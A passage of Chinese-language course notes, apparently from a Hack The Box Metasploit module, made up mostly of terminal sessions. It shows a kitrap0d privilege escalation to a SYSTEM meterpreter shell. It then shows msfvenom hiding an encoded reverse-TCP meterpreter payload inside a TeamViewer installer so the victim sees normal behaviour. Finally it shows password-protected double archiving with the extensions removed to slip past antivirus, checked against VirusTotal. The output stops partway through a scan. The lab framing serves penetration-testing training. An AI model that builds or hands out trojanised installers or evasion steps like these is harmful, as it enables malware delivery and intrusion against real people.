class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; search kitrap0d</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                     Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 0</span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms10_015_kitrap0d):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  2                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     tun0             yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     1338             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set LPORT 1338</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1338</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 3</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1338 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 3552 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 3552...</span><br><span class="line">[*] Injecting exploit into 3552 ...</span><br><span class="line">[*] Exploit injected. Injecting payload into 3552...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.14.5:1338 -&gt; 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h1 id="防火墙和-IDS-IPS-规避"><a href="#防火墙和-IDS-IPS-规避" class="headerlink" title="防火墙和 IDS&#x2F;IPS 规避"></a>防火墙和 IDS&#x2F;IPS 规避</h1><hr><p>为了更好地了解我们如何高效、安静地攻击目标，我们首先需要更好地了解该目标是如何防御的。我们介绍了两个新术语：</p><ul><li>端点保护</li><li>周界保护</li></ul><hr><h2 id="端点保护"><a href="#端点保护" class="headerlink" title="端点保护"></a>端点保护</h2><p><code>Endpoint protection</code>指任何本地化设备或服务，其唯一目的是保护网络上的单个主机。主机可以是个人计算机、公司工作站或网络非军事区 (De-Militarized Zone <code>DMZ</code>) 中的服务器。</p><p>端点保护通常以软件包的形式出现，其中包括<code>Antivirus Protection</code>, <code>Antimalware Protection</code>（这包括英国媒体报道软件、间谍软件、广告软件、恐吓软件、勒索软件），<code>Firewall</code>以及<code>Anti-DDOS</code>所有这些都在同一个软件包中。我们比后者更熟悉这种形式，因为我们大多数人都在家里的 PC 或工作场所的工作站上运行端点保护软件。Avast、Nod32、Malwarebytes 和 BitDefender 只是一些当前名称。</p><hr><h4 id="周界保护"><a href="#周界保护" class="headerlink" title="周界保护"></a>周界保护</h4><p><code>Perimeter protection</code>通常出现在网络外围边缘的物理或虚拟设备中。它们<code>edge devices</code>本身提供<code>inside</code>从 的网络访问<code>outside</code>，换句话说，从<code>public</code>到<code>private</code>。</p><p>在这两个区域之间，在某些情况下，我们还会发现第三个区域，称为非军事区 (De-Militarized Zone <code>DMZ</code>)，如前所述。这是一个<code>lower-security policy level</code>比一个地带<code>inside networks&#39;</code>，但比一个更高的<code>trust level</code>地带<code>outside zone</code>，这就是浩瀚的互联网。这是面向公众的服务器所在的虚拟空间，它们从 Internet 为公共客户端推送和拉取数据，但也从内部进行管理，并使用补丁、信息和其他数据进行更新，以使所服务的信息保持最新和满足服务器的客户。</p><hr><h2 id="安全政策"><a href="#安全政策" class="headerlink" title="安全政策"></a>安全政策</h2><p>安全策略是任何网络维护良好的安全状态背后的驱动力。它们的功能与 ACL（访问控制列表）对熟悉 Cisco CCNA 教育材料的任何人的作用相同。它们本质上是一个列表<code>allow</code>和<code>deny</code>语句，指示流量或文件如何存在于网络边界内。多个列表可以作用于多个网络部分，允许配置中的灵活性。这些列表还可以针对网络和主机的不同功能，具体取决于它们所在的位置：</p><ul><li>网络流量策略</li><li>申请政策</li><li>用户访问控制策略</li><li>文件管理政策</li><li>DDoS 保护策略</li><li>其他的</li></ul><p>虽然并非上述所有这些类别都带有“安全策略”一词，但围绕它们的所有安全机制都基于相同的基本原则运行，即和<code>allow</code>条目<code>deny</code>。唯一的区别是它们引用和应用的对象目标。所以问题仍然存在，我们如何将网络中的事件与这些规则匹配，以便可以采取前面提到的行动？</p><p>有多种方法可以将事件或对象与安全策略条目相匹配：</p><table><thead><tr><th><strong>安全政策</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Signature-based Detection</code></td><td>数据包在网络中的操作以及与称为签名的预建和预定攻击模式的比较。与这些签名的任何 100% 匹配都会产生警报。</td></tr><tr><td><code>Heuristic / Statistical Anomaly Detection</code></td><td>与既定基线的行为比较包括已知 APT（高级持续威胁）的作案手法签名。基线将确定网络的规范以及常用的协议。任何与最大阈值的偏差都会产生警报。</td></tr><tr><td><code>Stateful Protocol Analysis Detection</code></td><td>使用普遍接受的非恶意活动定义的预建配置文件，通过事件比较来识别协议的差异。</td></tr><tr><td><code>Live-monitoring and Alerting (SOC-based)</code></td><td>专用、内部或租用的 SOC（安全运营中心）中的一组分析师使用实时馈送软件来监控网络活动和中间警报系统以发现任何潜在威胁，自行决定是否应对威胁采取行动或让自动化机制会采取行动。</td></tr></tbody></table><hr><h2 id="规避技术"><a href="#规避技术" class="headerlink" title="规避技术"></a>规避技术</h2><p>现在大多数基于主机的防病毒软件主要依赖于<code>Signature-based Detection</code>识别软件样本中存在的恶意代码的各个方面。这些签名放置在防病毒引擎内，随后用于扫描存储空间和正在运行的进程以查找任何匹配项。当一个未知软件登陆分区并被防病毒软件匹配时，大多数防病毒软件会隔离恶意程序并杀死正在运行的进程。</p><p>我们如何避开所有这些热量？我们和它一起玩。本节中显示的示例<code>Encoders</code>表明，对于所有 AV 产品，仅使用不同的编码方案和多次迭代对有效载荷进行编码是不够的。此外，仅在攻击者和受害者之间建立一个通信通道就可以用现有的 IDS&#x2F;IPS 产品的当前功能发出一些警报。</p><p>然而，随着 MSF6 版本的发布，msfconsole 可以将 AES 加密的通信从任何 Meterpreter shell 隧道传输回攻击者主机，从而在有效负载发送到受害主机时成功加密流量。这主要用于处理基于网络的 IDS&#x2F;IPS。在极少数情况下，我们可能会遇到非常严格的流量规则集，这些规则集会根据发件人的 IP 地址标记我们的连接。避免这种情况的唯一方法是找到允许通过的服务。一个很好的例子就是 2017 年的 Equifax 黑客攻击，恶意黑客滥用 Apache Struts 漏洞访问关键数据服务器网络。DNS 渗漏技术用于缓慢地将数据从网络中吸出并进入黑客的域，几个月都不会被注意到。要了解有关此攻击的更多信息，请访问以下链接：</p><ul><li><a href="https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/">美国政府关于 Equifax 黑客攻击的事后分析报告</a></li><li><a href="https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411">防止 DNS 渗漏</a></li><li><a href="https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf">阻止数据泄露和恶意软件通过 DNS 传播</a></li></ul><p>回到 msfconsole，它现在支持 AES 加密隧道的能力，加上 Meterpreter 在内存中运行的特性，大大提高了我们的能力。然而，我们仍然有一个问题，即有效载荷一旦到达目的地，在运行并放入内存之前会发生什么。可以对该文件的签名进行指纹识别，与数据库进行匹配，并阻止我们访问目标的机会。我们还可以确定，AV 软件开发人员正在研究 msfconsole 模块和功能，以将生成的代码和文件添加到他们的签名数据库中，从而导致大多数（如果不是全部）默认有效负载立即被 AV 软件关闭。</p><p>我们很幸运，因为<code>msfvenom</code>提供了使用可执行模板的选项。这允许我们为可执行文件使用一些预设模板，将我们的有效载荷注入其中（没有双关语意），并使用<code>any</code>可执行文件作为我们可以发起攻击的平台。我们可以将 shellcode 嵌入到我们手边的任何安装程序、软件包或程序中，将有效负载 shellcode 隐藏在实际产品的合法代码深处。这极大地混淆了我们的恶意代码，更重要的是，降低了我们被检测到的机会。实际的、合法的可执行文件、我们不同的编码方案（及其迭代）和我们不同的有效负载 shellcode 变体之间有许多有效组合。这会生成所谓的后门可执行文件。</p><p>查看下面的代码片段，了解 msfvenom 如何将有效载荷嵌入到任何可执行文件中：</p><p> 周界保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/Desktop/TeamViewer_Setup.exe</span><br></pre></td></tr></table></figure><p> 周界保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes</span><br></pre></td></tr></table></figure><p>大多数情况下，当目标启动后门可执行文件时，似乎什么也不会发生，这在某些情况下会引起怀疑。为了提高我们的机会，我们需要触发已启动应用程序的正常执行的继续，同时将有效负载从主应用程序拉到一个单独的线程中。我们使用<code>-k</code>上面显示的标志来执行此操作。然而，即使<code>-k</code>标志正在运行，如果目标从 CLI 环境启动后门可执行模板，他们只会注意到正在运行的后门。如果他们这样做，将弹出一个单独的窗口，其中包含有效载荷，直到我们在目标上完成运行有效载荷会话交互后，该窗口才会关闭。</p><hr><h2 id="档案"><a href="#档案" class="headerlink" title="档案"></a>档案</h2><p>存档文件、文件夹、脚本、可执行文件、图片或文档等信息并在存档上放置密码可绕过当今许多常见的反病毒签名。但是，此过程的缺点是它们将作为通知在 AV 警报仪表板中提出，因为由于被密码锁定而无法扫描。管理员可以选择手动检查这些档案以确定它们是否是恶意的。</p><h4 id="生成有效载荷-1"><a href="#生成有效载荷-1" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/test.js</span><br></pre></td></tr></table></figure><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat test.js</span><br><span class="line"></span><br><span class="line">�+n&quot;����t$�G4ɱ1zz��j�V6����ic��o�Bs&gt;��Z*�����9vt��%��1�</span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��</span><br></pre></td></tr></table></figure><p>如果我们检查 VirusTotal 以从我们生成的有效负载中获取检测基线，结果将如下所示。</p><h4 id="病毒总数"><a href="#病毒总数" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test.js </span><br><span class="line"></span><br><span class="line">[*] WARNING: When you upload or otherwise submit content, you give VirusTotal</span><br><span class="line">[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable</span><br><span class="line">[*] licence to use, edit, host, store, reproduce, modify, create derivative works,</span><br><span class="line">[*] communicate, publish, publicly perform, publicly display and distribute such</span><br><span class="line">[*] content. To read the complete Terms of Service for VirusTotal, please go to the</span><br><span class="line">[*] following link:</span><br><span class="line">[*] https://www.virustotal.com/en/about/terms-of-service/</span><br><span class="line">[*] </span><br><span class="line">[*] If you prefer your own API key, you may obtain one at VirusTotal.</span><br><span class="line"></span><br><span class="line">[*] Enter &#x27;Y&#x27; to acknowledge: Y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test.js...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a</span><br><span class="line">[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309</span><br><span class="line">[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167047</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test.js (11 / 59): &lt;...SNIP...&gt;</span><br><span class="line">====================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version               Result                             Update</span><br><span class="line"> ---------             --------  -------               ------                             ------</span><br><span class="line"> ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Acronis               false     1.2.0.108                                                20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230                                             20220510</span><br><span class="line"> Antiy-AVL             false     3.0                                                      20220510</span><br><span class="line"> Arcabit               false     1.0.0.889                                                20220510</span><br><span class="line"> Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Avira                 false     8.3.3.14                                                 20220510</span><br><span class="line"> Baidu                 false     1.0.0.2                                                  20190318</span><br><span class="line"> BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0                                              20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899                                               20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                                                    20220510</span><br><span class="line"> CMC                   false     2.10.2019.1                                              20211026</span><br><span class="line"> ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509</span><br><span class="line"> Comodo                false     34607                                                    20220510</span><br><span class="line"> Cynet                 false     4.0.0.27                                                 20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                                                  20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040                                              20220510</span><br><span class="line"> ESET-NOD32            false     25243                                                    20220510</span><br><span class="line"> Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510</span><br><span class="line"> F-Secure              false     18.10.978.51                                             20220510</span><br><span class="line"> FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Fortinet              false     6.2.142.0                                                20220510</span><br><span class="line"> GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174                                               20220510</span><br><span class="line"> Ikarus                false     6.0.24.0                                                 20220509</span><br><span class="line"> Jiangmin              false     16.0.100                                                 20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275                                              20220510</span><br><span class="line"> K7GW                  false     12.12.42275                                              20220510</span><br><span class="line"> Kaspersky             false     21.0.1.45                                                20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                            20220510</span><br><span class="line"> Lionic                false     7.5                                                      20220510</span><br><span class="line"> MAX                   true      2019.9.16.1           malware (ai score=89)              20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                                                 20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                                                  20220510</span><br><span class="line"> McAfee                false     6.0.6.653                                                20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Microsoft             false     1.1.19200.5                                              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588                                            20220510</span><br><span class="line"> Panda                 false     4.6.4.2                                                  20220509</span><br><span class="line"> Rising                false     25.0.0.27                                                20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032                                               20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                                                 20220507</span><br><span class="line"> Sophos                false     1.4.1.0                                                  20220510</span><br><span class="line"> Symantec              false     1.17.0.0                                                 20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02                                            20220510</span><br><span class="line"> Tencent               false     1.0.0.1                                                  20220510</span><br><span class="line"> TrendMicro            false     11.0.0.1006                                              20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040                                              20220510</span><br><span class="line"> VBA32                 false     5.0.0                                                    20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0                                              20220510</span><br><span class="line"> VirIT                 false     9.5.191                                                  20220509</span><br><span class="line"> Yandex                false     5.5.2.24                                                 20220428</span><br><span class="line"> Zillya                false     2.0.0.4627                                               20220509</span><br><span class="line"> ZoneAlarm             false     1.0                                                      20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                                                  20220509</span><br></pre></td></tr></table></figure><p>现在，尝试将其存档两次，在创建时为两个存档都设置密码，并从它们的名称中删除<code>.rar</code>&#x2F; <code>.zip</code>&#x2F;<code>.7z</code>扩展名。为此，我们可以从 RARLabs 安装<a href="https://www.rarlab.com/download.htm">RAR 实用程序</a>，它的工作方式与 Windows 上的 WinRAR 完全一样。</p><h4 id="存档有效负载"><a href="#存档有效负载" class="headerlink" title="存档有效负载"></a>存档有效负载</h4><p> 存档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz</span><br><span class="line">vnswer77@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar</span><br><span class="line">vnswer77@htb[/htb]$ rar a ~/test.rar -p ~/test.js</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar -?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test.rar</span><br><span class="line">Adding    test.js                                                     OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p> 存档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test.js   test.rar</span><br></pre></td></tr></table></figure><h4 id="删除-RAR-扩展名"><a href="#删除-RAR-扩展名" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test.rar test</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test.js</span><br></pre></td></tr></table></figure><h4 id="再次归档有效负载"><a href="#再次归档有效负载" class="headerlink" title="再次归档有效负载"></a>再次归档有效负载</h4><p> 再次归档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ rar a test2.rar -p test</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar -?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test2.rar</span><br><span class="line">Adding    test                                                        OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure><h4 id="删除-RAR-扩展名-1"><a href="#删除-RAR-扩展名-1" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test2.rar test2</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test2   test.js</span><br></pre></td></tr></table></figure><p>test2 文件是最终的 .rar 存档文件，其扩展名 (.rar) 从名称中删除。之后，我们可以继续将其上传到 VirusTotal 以进行另一次检查。</p><h4 id="病毒总数-1"><a href="#病毒总数-1" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test2</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test2...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d</span><br><span class="line">[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429</span><br><span class="line">[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167804</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for 